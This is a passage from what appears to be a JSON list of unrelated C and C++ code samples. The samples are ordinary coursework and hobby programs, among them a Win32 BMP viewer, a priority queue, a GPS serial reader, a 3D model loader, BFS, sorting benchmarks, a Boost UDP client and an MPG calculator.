\u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)\n{\n    static wchar_t* selectedFile = nullptr; // \u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 selectedFile\n    static ImgInfo* info = nullptr; // \u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 info\n    switch (msg)\n    {\n\n    case WM_COMMAND:\n        // \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439 \u043c\u0435\u043d\u044e\n        switch (LOWORD(wParam))\n        {\n        case IDM_OPEN:\n            // \u041e\u0442\u043a\u0440\u044b\u0442\u0438\u0435 BMP \u0444\u0430\u0439\u043b\u0430\n            if (OpenBMPFile(hwnd, &selectedFile))\n            {\n                info = readPixelColorsFromFile(selectedFile);\n                if (info)\n                {\n                    InvalidateRect(hwnd, NULL, TRUE);\n                }\n            }\n            break;\n        }\n        break;\n\n    case WM_PAINT:\n    {\n        PAINTSTRUCT ps;\n        HDC hdc = BeginPaint(hwnd, &ps); int height = LOWORD(lParam);\n        int width = HIWORD(lParam);\n        PaintRgn(hdc, CreateRectRg",
    "/ UMBC - CMSC 341 - Spring 2024 - Proj3                                                                                                                                     \n#include \"rqueue.h\"\n\n//Name: RQueue (Constructor)                                                                                                                                                 \n//Desc: Creates empty queue and initializes values                                                                                                                           \n//Preconditions: required variables provided                                                                                                                                 \n//Postconditions: Empty queue is created with intialized values                                                                                                              \nRQueue::RQueue(prifn_t priFn, HEAPTYPE heapType, STRUCTURE structure) {\n  m_heap = nullptr;\n  m_size = 0;\n  m_priorFunc = priFn;\n  m_heapType = heapType;\n  m_structure = structure;\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all memory and re-initializaed the member variables                                                                                                      \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All memory is deallocated and member variables reinitialized                                                                                               \nRQueue::~RQueue() {\n  clear();\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all nodes and re-initializaed the member variables                                                                                                       \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All nodes are deallocated and member variables reinitialized                                                                                               \n//leaving an empty heap                                                                                                                                                      \nvoid RQueue::clear() {\n  clear(m_heap);\n  m_size = 0;\n}\n\n\n\n//Name: RQueue (Copy Constructor)                                                                                                                                            \n//Desc: creates a deep copy of rhs object                                                                                                                                    \n//Preconditions: Heap exist                                                                                                                                                  \n//Postconditions: a deep copy of heap is created                                                                                                                             \nRQueue::RQueue(const RQueue& rhs) {\n  //copies mem variables                                                                                                                                                     \n  m_size = rhs.m_size;\n  m_priorFunc = rhs.m_priorFunc;\n  m_heapType = rhs.m_heapType;\n  m_structure = rhs.m_structure;\n\n  //if root exists                                                                                                                                                           \n  if(rhs.m_heap != nullptr){\n    //recursive copy                                                                                                                                                         \n    copy(m_heap, rhs.m_heap);\n\n    //in case empty heap                                                                                                                                                     \n  }else{\n    m_heap = nullptr;\n  }\n}\n\n//Name: getHeapType                                                                                                                                                          \n//Desc: returns heap type                                                                                                                                                    \n//Preconditions: tree exists with defined heap type                                                                                                                          \n//Postconditions: heap type is returned                                                       ",
    "\r\n#include <TinyGPSPlus.h>\r\n#include <HardwareSerial.h>\r\n\r\nHardwareSerial SerialPort(1); // use UART1\r\n\r\nTinyGPSPlus gps;\r\n\r\n\r\nvoid displayInfo()\r\n{\r\n  Serial.print(F(\"Location: \")); \r\n  if (gps.location.isValid())\r\n  {\r\n    Serial.print(gps.location.lat(), 6);\r\n    Serial.print(F(\",\"));\r\n    Serial.print(gps.location.lng(), 6);\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\"  Date/Time: \"));\r\n  if (gps.date.isValid())\r\n  {\r\n    Serial.print(gps.date.month());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.day());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.year());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\" \"));\r\n  if (gps.time.isValid())\r\n  {\r\n    if (gps.time.hour() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.hour());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.minute() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.minute());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.second() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.second());\r\n    Serial.print(F(\".\"));\r\n    if (gps.time.centisecond() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.centisecond());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.println();\r\n}\r\n\r\nvoid setup()\r\n{\r\n  Serial.begin(115200);\r\n  SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n\r\n  while(!Serial);\r\n    Serial.println(\"Initializing\");\r\n\r\n  \r\n  delay(5000);\r\n  Serial.println(\"Test\");\r\n\r\n  SerialPort.println(\"$PMTK314,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0*29<CR><LF>\");\r\n\r\n  SerialPort.println(\"$PMTK220,100*2F<CR><LF>\");\r\n  //SerialPort.println(\"$PMTK251,115200*1F<CR><LF>\");\r\n\r\n  //SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n  \r\n}\r\n\r\nvoid loop()\r\n{\r\n  // This sketch displays information every time a new sentence is correctly encoded.\r\n  while (SerialPort.available() > 0)\r\n    Serial.print(char(SerialPort.read()));\r\n    /*gps.encode(SerialPort.read());\r\n\r\n    \r\n    Serial.print(\"LAT=\"); Serial.print(gps.location.lat(), 6);\r\n    Serial.print(\" \");\r\n    Serial.print(\"LNG=\"); Serial.println(gps.location.lng(), 6);\r\n    Serial.println(gps.time.value());\r\n    Serial.println(\"\");\r\n    delay(1000);*/\r\n    \r\n\r\n  /*if (millis() > 5000 && gps.charsProcessed() < 10)\r\n  {\r\n    Serial.println(F(\"No GPS detected: check wiring.\"));\r\n    while(true);\r\n  }*/\r\n}\r\n\r\n",
    "#include \"model_loading.hpp\"\n\n#include <iostream>\n\n#include \"assimp/Importer.hpp\"\n#include \"assimp/postprocess.h\"\n#include <utility>\n\n/**\n * overview:\n * initialization:\n *  first we iterate through the entire assimp imported object recursively\n *  we store all the images we found in the base model, this is the initialization phase.\n *\n */\n\nMesh::Mesh(std::vector<Vertex> vertices, std::vector<unsigned int> indices) {\n    this->vertices = std::move(vertices);\n    this->indices = std::move(indices);\n};\n\n/**\n * \\brief loads a 3d model into wrapper structure\n *\n * \\pre the shader files specified exist and are at this file path\n * \\todo have a resource directory so that we don't have to specify a long relative path\n *\n * @param path the path to the model we want to load\n */\nModel::Model(std::string path) { this->load_model(std::move(path)); }\n\n/**\n * notes:\n * \t- this function is the entry point to the initialization process\n * \t- although this function looks short and simple, the call to process_node\n * \tis recursive and does all the work of parsing assimp's structure\n */\nvoid Model::load_model(std::string path) {\n    Assimp::Importer importer;\n    const aiScene *scene = importer.ReadFile(path, aiProcess_Triangulate);\n    if (!scene || scene->mFlags & AI_SCENE_FLAGS_INCOMPLETE || !scene->mRootNode) {\n        std::cout << \"ERROR::ASIMP::\" << importer.GetErrorString() << std::endl;\n        return;\n    }\n    this->directory = path.substr(0, path.find_last_of(\"/\"));\n    printf(\"starting to process nodes \\n\");\n    this->process_node(scene->mRootNode, scene);\n    printf(\"processed all nodes\\n\");\n};\n\n/**\n * notes:\n * - recall that a node may contains a collection of meshes, and\n * also children nodes\n * - this function is guarenteed to terminate because modellers\n * create strctures made up of finitely many nodes and meshes.\n * - this can be thought of the same way that each folder in blender can have individual meshes inside or more\n * folders (I believe a folder is called a collection) and just represents arbitrary nesting\n */\nvoid Model::process_node(aiNode *node, const aiScene *scene) {\n    printf(\"stared processing meshes\\n\");\n    for (unsigned int i = 0; i < node->mNumMeshes; i++) {\n        aiMesh *mesh = scene->mMeshes[node->mMeshes[i]];\n        this->meshes.push_back(this->process_mesh(mesh, scene));\n    }\n    printf(\"finished processing meshes\\n\");\n    for (unsigned int i = 0; i < node->mNumChildren; i++) {\n        process_node(node->mChildren[i], scene);\n    }\n};\n\nglm::vec3 assimp_to_glm_3d_vector(aiVector3D assimp_vector) {\n    return {assimp_vector.x, assimp_vector.y, assimp_vector.z};\n}\n\nstd::vector<Vertex> Model::process_mesh_vertices(aiMesh *mesh) {\n    std::vector<Vertex> vertices;\n\n    bool mesh_has_texture_coordinates = mesh->mTextureCoords[0] != nullptr;\n    printf(\"This mesh has %d vertices\\n\", mesh->mNumVertices);\n    for (unsigned int i = 0; i < mesh->mNumVertices; i++) {\n        Vertex vertex;\n        vertex.position = assimp_to_glm_3d_vector(mesh->mVertices[i]);\n        vertices.push_back(vertex);\n    }\n    return vertices;\n}\n\n/**\n * \\brief given a mesh iterate through each face storing all indices of each vertex on that face\n */\nstd::vector<unsigned int> Model::process_mesh_indices(aiMesh *mesh) {\n    std::vector<unsigned int> indices;\n    for (unsigned int i = 0; i < mesh->mNumFaces; i++) {\n        aiFace face = mesh->mFaces[i];\n\n        assert(face.mNumIndices == 3); // if this is false we are not working with triangles\n\n        for (unsigned int j = 0; j < face.mNumIndices; j++) {\n            indices.push_back(face.mIndices[j]);\n        }\n    }\n    return indices;\n}\n\n/**\n * description\n * \ttakes in assimp's interpretation of a mesh, and then parses it\n * \tinto our version of a mesh\n */\nMesh Model::process_mesh(aiMesh *mesh, const aiScene *scene) {\n    std::vector<Vertex> vertices = this->process_mesh_vertices(mesh);\n    std::vector<unsigned int> indices = this->process_mesh_indices(mesh);\n    return {vertices, indices};\n};\n",
    "#include <iostream>\n#include <queue>\n#include <vector>\nusing namespace std;\n\n// Data structure to store a graph edge\nstruct Edge {\n    int src, dest;\n};\n\n// A class to represent a graph object\nclass Graph {\npublic:\n    // a vector of vectors to represent an adjacency list\n    vector<vector<int>> adjList;\n\n    // Graph Constructor\n    Graph(vector<Edge> const &edges, int n) {\n        // resize the vector to hold `n` elements of type `vector<int>`\n        adjList.resize(n);\n\n        // add edges to the undirected graph\n        for (auto &edge: edges) {\n            adjList[edge.src].push_back(edge.dest);\n            adjList[edge.dest].push_back(edge.src);\n        }\n    }\n};\n\n// Perform BFS iteratively on the graph\nvoid BFS(Graph const &graph, int start, vector<bool> &discovered) {\n    queue<int> q;\n\n    // mark the start vertex as discovered and enqueue it\n    discovered[start] = true;\n    q.push(start);\n\n    // loop till queue is empty\n    while (!q.empty()) {\n        // dequeue front node and print it\n        int v = q.front();\n        q.pop();\n        cout << v << \" \";\n\n        // do for every edge (v, u)\n        for (int u : graph.adjList[v]) {\n            if (!discovered[u]) {\n                // mark it as discovered and enqueue it\n                discovered[u] = true;\n                q.push(u);\n            }\n        }\n    }\n}\n\nint main() {\n    // vector of graph edges as per the above diagram\n    vector<Edge> edges = {\n        {1, 2}, {1, 3}, {1, 4}, {2, 5}, {2, 6}, {5, 9},\n        {5, 10}, {4, 7}, {4, 8}, {7, 11}, {7, 12}\n        // vertex 0, 13, and 14 are single nodes\n    };\n\n    // total number of nodes in the graph (labelled from 0 to 14)\n    int n = 15;\n\n    // build a graph from the given edges\n    Graph graph(edges, n);\n\n    // to keep track of whether a vertex is discovered or not\n    vector<bool> discovered(n, false);\n\n    // Perform BFS traversal from all undiscovered nodes to\n    // cover all connected components of a graph\n    for (int i = 0; i < n; i++) {\n        if (!discovered[i]) {\n            // start BFS traversal from vertex `i`\n            BFS(graph, i, discovered);\n        }\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"latihan\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <array>\n#include <iostream>\n#include <boost/asio.hpp>\n\nusing boost::asio::ip::udp;\n\nint main(int argc, char *argv[])\n{\n    try\n    {\n        if (argc != 3)\n        {\n            std::cerr << \"Usage: client <host1> <port>\" << std::endl;\n            return 1;\n        }\n\n        boost::asio::io_context io_context;\n\n        // Define the target endpoint (localhost, port 14)\n        boost::asio::ip::udp::endpoint receiver1_endpoint(boost::asio::ip::address::from_string(argv[1]), std::stoi(argv[2]));\n\n        udp::socket socket(io_context);\n        socket.open(udp::v4());\n\n        std::array<char, 1> send_buf = {{0}};\n        socket.send_to(boost::asio::buffer(send_buf), receiver1_endpoint);\n\n        std::array<char, 128> recv_buf;\n        udp::endpoint sender_endpoint;\n        size_t len = socket.receive_from(\n            boost::asio::buffer(recv_buf), sender_endpoint);\n\n        std::cout.write(recv_buf.data(), len);\n    }\n    catch (std::exception &e)\n    {\n        std::cerr << e.what() << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\n#include <algorithm>\nusing std::cout;\nusing std::endl;\nusing std::swap;\nusing std::sort;\n\nusing std::clock_t;\nconst int CLOCKS_PER_MS = CLOCKS_PER_SEC/1000; // clock per milliseconds\n\nconst int NUMBERS_SIZE = 50000;\n\n// random number in range -> for test code\nint genRandInt(int low, int high) {\n   return low + rand() % (high - low + 1);\n}\n\n// fill arrays -> for test code\nvoid fillArrays(int arr1[], int arr2[],int arr3[]) {\n  for(int i = 0; i < NUMBERS_SIZE; ++i){\n    arr1[i] = genRandInt(0,NUMBERS_SIZE);\n    arr2[i] = arr1[i];\n    arr3[i] = arr1[i];\n  }\n}\n\n// helper for quicksorts\nint QPartition(int numbers[], int low, int high, int pivotIndex) {\n  int pivot = numbers[pivotIndex];\n  while (true) {  // continuously loops until fin is true\n    // until reaches element left of pivot that is greater than pivot value\n    while (numbers[low] < pivot) { ++low; }\n    // until reaches element right of pivot that is less than pivot value\n    while (pivot < numbers[high]) { --high; }\n    if (low >= high) break;  // checks if there are unsorted elements\n    // if continues, low index is still less than high index\n    swap(numbers[low], numbers[high]);\n    ++low;\n    --high;\n  }\n  return high;\n}\n\n// sorts given array in range using quicksort method, recursive\nvoid Quicksort_midpoint(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  mid = QPartition(numbers, low, high, mid);  // call helper\n  Quicksort_midpoint(numbers, low, mid);  // left half recursive call\n  Quicksort_midpoint(numbers, mid + 1, high); // right half recursive call\n}\n\n// sort given array in range using quicksort method, but chooses pivot by\n// choosing middle value of low, middle, and high indexes, recursive\nvoid Quicksort_medianOfThree(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  int pivot = mid;  // element at mid is pivot by default\n  // element at lowest index is middle value\n  if ((numbers[mid] < numbers[low] && numbers[low] < numbers[high]) ||\n      (numbers[high] < numbers[low] && numbers[low] < numbers[mid])) pivot = low;\n  // element at highest index is middle value\n  if ((numbers[mid] < numbers[high] && numbers[high] < numbers[low]) ||\n      (numbers[low] < numbers[high] && numbers[high] < numbers[mid])) pivot = high;\n  mid = QPartition(numbers, low, high, pivot);  // call helper\n  Quicksort_medianOfThree(numbers, low, mid); // left half recursive call\n  Quicksort_medianOfThree(numbers, mid + 1, high);  // right half recursive call\n}\n\n// sorts given array using insertion sort method\nvoid InsertionSort(int numbers[], int numbersSize) {\n  for (int i = 1; i < numbersSize; ++i) { // sorts every element in array\n    int j = i;\n    // shifts element left to correct spot\n    while (j > 0 && numbers[j] < numbers[j - 1]) {\n      swap(numbers[j], numbers[j - 1]);\n      --j;\n    }\n  }\n}\n\n// helper, returns true if sorted, else false\nstatic bool is_sorted(int numbers[], int numbersSize) {\n  if (numbersSize <= 0) return true;  // will be sorted if empty\n  int last = numbers[0];\n  for(int i=0; i < numbersSize; ++i) {  // checks all elements\n    int curr = numbers[i];\n    if (curr < last) return false;  // prev value is greater than curr -> not sorted properly\n    last = curr;\n  }\n  return true;\n}\n\n// put vector in array after randomizing in main\nstatic void copy_vector_into_array(const std::vector<int>& source, int array[]) {\n  for(int i=0;i<static_cast<int>(source.size()); ++i) { // iterate through vector\n    array[i] = source[i];\n  }\n}\n\nint main() {\n  std::vector<int> sample;\n  sample.reserve(NUMBERS_SIZE);\n  // randomize array\n  for(int i=0; i<NUMBERS_SIZE; ++i) {\n    sample.push_back(rand() % (NUMBERS_SIZE + 1));\n  }\n  \n  // run tests across different sizes\n  int test_sizes[4] = { 10, 100, 1000, 50000 };\n  int test_array[NUMBERS_SIZE];\n  for(int i=0; i<4; ++i) {  // loops for four different sizes\n    int size = test_sizes[i];\n    cout << endl;\n    cout << \"-------------------- size \" << size << \" --------------------\" << endl;\n\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_midpoint(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort midpoint is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // QUICKSORT MEDIAN OF THREE SORT\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_medianOfThree(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort median of three is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // INSERTION SORT\n    {\n      co",
    "#include <iostream>\r\nusing namespace std;\r\n#include <string>\r\n#include<vector>\r\n\r\n// Idea is Creating a family tree using a single linked list from head to bottom\r\n\r\nclass Person{\r\n    public: //must specify otherwise default private\r\n    string _name;\r\n    vector<Person*> _children={}; //list of pointers not objects so if one object changes the change is reflected when accessing the pointer instead of ending up with 2 different objects in memory originating from 1 object change.\r\n\r\n    Person(string name){_name=name;}\r\n\r\n    void NullPtrCheck(){\r\n        if (this == nullptr){\r\n            cout<<\"Error: Cannot perform action on Nullptr\\n\";\r\n            return;\r\n        }\r\n    }\r\n\r\n    #pragma region adders\r\n    void addChild(Person* p){\r\n        NullPtrCheck();\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else\r\n            _children.push_back(p);\r\n        }\r\n\r\n    void addChild(string name){\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else{\r\n        NullPtrCheck();\r\n        Person* p = new Person(name);\r\n        _children.push_back(p);\r\n        // }\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region Printers\r\n    void PrintChildren(){ //this could also be outside of Class in the form of PrintChildren(Person* p) since no private var access needed\r\n        cout<<\"Children of \"<<this->returnName()<<\": \";\r\n        \r\n        //print first child, seperated from loop just for the sake of output format not ending with a \",\"\r\n        if (_children.size()>=1)\r\n            cout<<_children[0]->returnName();\r\n\r\n        for (int i = 1; i < _children.size(); i++)\r\n        {\r\n            cout<<\", \";\r\n            cout<<_children[i]->returnName();\r\n        }\r\n        cout<<\"\\n\";\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region getters\r\n    string returnName(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST PRINT this->name\r\n        if (this != nullptr) {\r\n            return this->_name;\r\n        } else {\r\n            return \"NAN\";\r\n        }\r\n    }\r\n\r\n    vector<Person*> returnChildren(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST USE this->_children\r\n        if (this != nullptr) {\r\n            return this->_children;\r\n        } else {\r\n            return {};\r\n        }\r\n    }\r\n\r\n    Person* getChild(string name){ //BFS same as isChild, just return object instead of bool\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return p;\r\n        }\r\n        return nullptr;\r\n    }\r\n\r\n    // Person* getNthChild(string name){ //BFS or DFS to see if a person if part of the parent's lineage\r\n    //     while (this->returnChildren() != {}){\r\n\r\n    //     }\r\n    //     return nullptr;\r\n    // }\r\n\r\n    // Person* getParent(Person* head){ //get Parent of specific entity. Need to start from head since it's single linked list\r\n    //     if (this == head) //cannot be parent if you are yourself the root. If you're not the root then you must be someone's child\r\n    //         return nullptr;\r\n\r\n    //     Person* p = head;\r\n    //     while (p->returnChildren()!={})\r\n    //     {\r\n    //         if(p->isChild(this->returnName())) //if i am the child of the current entity, then this entity is my parent\r\n    //             return p;\r\n    //     }\r\n    // }\r\n    #pragma endregion\r\n\r\n    #pragma region checkers\r\n    bool isChild(string name){ //O(n). BFS :) same as getChild, just return bool instead of object\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool isGrandChild(string name){//use isChild. DFS, O(n^2)\r\n        for (Person* p : this->returnChildren()){ //for every child of this entity\r\n            if (p->isChild(name)) //check if input is a child of the child iterated\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // bool isNthChild(string name, int n){ //DFS recursion of isChild\r\n    //     return false;\r\n    // } \r\n    #pragma endregion\r\n};\r\n\r\n#pragma region global functions\r\n//no need for it to be in Class (part of object) since no private var access needed. If in Class, it would be in the same format as PrintChildren\r\nvoid PrintTree(Person* head){ //BFS, should use PrintChildren\r\n    cout<<head->returnName()<<\": \";\r\n    // Person *p = head;\r\n    // While p.children is not empty{\r\n    //     cout<<p->name<<\", \";\r\n    // }\r\n    cout<<\"\\n\";\r\n}\r\n\r\nPerson* getPerson(Person* head, string name){ //BFS or DFS to see if a person is part of tree\r\n        if (head->returnName() ==name)\r\n            return head;\r\n\r\n        // while (this->returnChildren() != {}){\r\n\r\n        // }\r\n        return nullptr;\r\n    }\r\n\r\nbool Exists(Person *head, string name){\r\n    if (getPerson(head, name) ==nullptr)\r\n        return false;\r\n    return true;\r\n}\r\n#pragma endregion\r\n\r\nint main(){\r\n    //creating family tree ahmad->ali->edy\r\n ",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <limits>\n#include <cctype>\nusing namespace std;\n\ndouble calcMPG(double gallons, double miles);\n\nint main()\n{\n\tconst double MAX_GALS = 100;\n\tconst double MILES = 500;\n\tbool valid = true;\n\tdouble gallons = 0.0;\n\tdouble mpg = 0.0;\n\tstring carMake;\n\n\n\tcout << \"Enter the make of the car: \";\n\tgetline(cin, carMake);\n\n\tdo\n\t{\n\t\tcout << \"\\nEnter how many gallons of fuel were used: \";\n\t\tcin >> gallons;\n\n\t\tif (cin.fail() || gallons <= 0) // Check for invalid input in the form of characters or 0 or negative numbers\n\t\t{\n\t\t\tif (cin.fail())\n\t\t\t{\n\t\t\t\tcout << \"\\nPlease enter numbers and not characters.\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"\\nInvalid input. Please enter a positive number.\\n\";\n\t\t\t}\n\t\t\tcin.clear(); // clear error flag\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n'); // ignore input in buffer until newline character\n\t\t\tvalid = false; // set flag to false to ensure do while loops again\n\t\t}\n\t\telse if (gallons > MAX_GALS)\n\t\t{\n\t\t\tcout << \"\\nThat seems like a very high amount. Are you sure? (y/n): \";\n\t\t\tchar confirm;\n\t\t\tcin >> confirm;\n\n\t\t\tif (tolower(confirm) == 'y')\n\t\t\t{\n\t\t\t\tvalid = true;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tvalid = false;\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tvalid = true; // set flag to true to exit loop\n\t\t}\n\t} while (!valid);\n\n\tmpg = calcMPG(gallons, MILES);\n\n\tcout << fixed << setprecision(2);\n\tcout << endl << \"During the 500 mile drive, the \" << carMake << \"'s fuel efficiency was \" << mpg << \" miles per gallon.\" << endl;\n\n\treturn 0;\n}\n\ndouble calcMPG(double gallons, double miles)\n{\n\treturn miles / gallons;\n}"
]